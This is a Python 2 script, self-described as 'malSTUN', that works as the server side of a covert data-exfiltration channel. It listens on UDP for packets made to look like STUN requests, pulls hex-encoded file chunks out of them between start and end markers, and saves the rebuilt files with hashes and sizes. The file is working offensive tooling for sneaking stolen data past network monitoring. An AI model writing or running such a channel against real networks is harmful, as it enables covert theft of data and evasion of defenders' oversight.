#!/usr/bin/env python
# coding: utf-8
# Use at your own risk

import sys
import os
import socket
import uuid
import binascii
import argparse
import hashlib

PAYLOAD_START = "53544152542046494c452e2e"
PAYLOAD_END = "454e442046494c452e2e2e2e"
STUN_METHOD = "0001"
STUN_LENGTH = "0000"
STUN_COOKIE = "2112a421"


def listen():
    try:
        while True:
            data, addr = sock.recvfrom(1024)
            raw = binascii.b2a_hex(data)

            # If this is a STUN packet
            if raw.startswith(STUN_METHOD + STUN_LENGTH + STUN_COOKIE):
                binary = raw.replace(STUN_METHOD + STUN_LENGTH + STUN_COOKIE, "")[:24]
                if binary == PAYLOAD_START:
                    payload = str(uuid.uuid4()) + ".dump"
                    f = open(payload, 'wb')
                    print "New payload from: " + str(addr) + "\nSaving to: " + str(payload)
                elif binary == PAYLOAD_END:
                    f.close()
                    print "End of payload! Saved to: " + str(payload)
                    stats(payload, addr)
                else:
                    f.write(binascii.unhexlify(binary))
                    if args['verbose']:
                        print "Transaction in progress... " + str(addr) + str(binascii.unhexlify(binary))
            else:
                print "Unexpected data!"
    except KeyboardInterrupt:
        print "Closing!"
        sock.close()
        sys.exit()


def stats(payload, addr):
    print"""
    STATS:
    * Payload: %s
    * Received from: %s
    * SHA256: %s
    * Size: %s\n""" % (payload, addr, hashlib.sha256(open(payload, 'rb').read()).hexdigest(), os.stat(payload).st_size)


if __name__ == '__main__':
    parser = argparse.ArgumentParser(formatter_class=argparse.RawDescriptionHelpFormatter,
                                     description="malSTUN server.py - Data exfil via STUN protocol")
    parser.add_argument('-s', '--server', required=True, help='STUN Server Listen Address')
    parser.add_argument('-p', '--port', required=True, help='STUN Server Listen Port')
    parser.add_argument('-v', '--verbose', required=False, help='Enable verbose output', action='store_true')
    args = vars(parser.parse_args())
    UDP_IP = args['server']
    UDP_PORT = int(args['port'])
    print """
    ***************************************
    Running server.py!
    ***************************************
    * Listening on: %s
    * Port: %s
    ***************************************""" % (UDP_IP, UDP_PORT)
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    sock.bind((UDP_IP, UDP_PORT))
    listen()
